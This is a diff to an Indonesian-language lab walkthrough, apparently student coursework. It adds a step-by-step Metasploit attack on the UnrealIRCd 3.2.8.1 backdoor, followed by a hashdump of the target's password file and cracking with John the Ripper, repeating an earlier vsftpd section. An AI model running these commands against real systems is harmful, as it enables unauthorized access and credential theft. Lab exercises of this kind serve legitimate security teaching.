@@ -65,7 +65,32 @@
 7. Misalnya disini saya akan melakukan exploit terhadap hashdump. Kita ketikkan perintah: `use post/linux/gather/hashdump`. Kemudian set session yang sedang berjalan dengan perintah: `set session 1`. Untuk eksekusi ketikkan perintah: `run`
 ![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_7.PNG "")
 
-8. Saat kita mengecek file dump tersebut, isi filenya masih terenkiprsi. Oleh karena itu kita akan mendecrypt dengan bantuan tool lain, yaitu John de Ripper. Untuk menjalankan tool tersebut kita akan masuk ke direktori `/usr/sbin`, kemudian jalankan John de Ripper dengan mengetikkan perintah: `./john [Lokasi_File_Hashdump]`
+8. Saat kita mengecek file dump tersebut, isi filenya masih terenkripsi. Oleh karena itu kita akan mendecrypt dengan bantuan tool lain, yaitu John de Ripper. Untuk menjalankan tool tersebut kita akan masuk ke direktori `/usr/sbin`, kemudian jalankan John de Ripper dengan mengetikkan perintah: `./john [Lokasi_File_Hashdump]`
 ![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_8.PNG "")
 
-9. Dari gambar di atas, setelah file dump berhasil di decrypt kita dapat melihat username dan password target kita.
+9. Dari gambar di atas, setelah file dump berhasil di decrypt kita dapat melihat username dan password target kita
+
+### Exploit unreal_ircd_3281_backdoor
+
+1. Sama dengan exploit sebelumnya, pertama kita masuk ke metasploit console dengan cara mengetikkan perintah: `msfconsole`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_1.PNG "")
+
+2. Setelah masuk ke metasploit console, kita akan mencari exploitnya dengan mengetikkan perintah: `search unreal`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_2.PNG "")
+
+3. Setelah mendapatkan yang kita cari, kemudian kita masuk kedalamnya dengan mengetikkan perintah: `use exploit/unix/irc/unreal_ircd_3281_backdoor` dan jangan lupa untuk setting ip target yang akan di exploit dengan mengetikkan perintah: `set RHOST [IP_Target]`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_3.PNG "")
+
+4. Kita akan melakukan exploit. Ketikkan perintah: `exploit -z`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_4.PNG "")
+
+5. Lihat session yang sedang berjalan dengan perintah: `sessions -l`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_5.PNG "")
+
+6. Kemudian kita akan melihat post apa saja yang tersedia dengan mengetikkan perintah: `show post`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_6.PNG "")
+
+7. Seperti exploit sebelumnya, disini saya kembali akan melakukan exploit terhadap hashdump. Kita ketikkan perintah: `use post/linux/gather/hashdump`. Kemudian set session yang sedang berjalan dengan perintah: `set session 1`. Untuk eksekusi ketikkan perintah: `run`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_7.PNG "")
+
+8. Sama seperti sebelumnya, kita akan melakukan decrypt dengan bantuan tool John de Ripper untuk mendapatkan username dan password target dengan cara mengetikkan perintah: `./john [Lokasi_File_Hashdump]`.
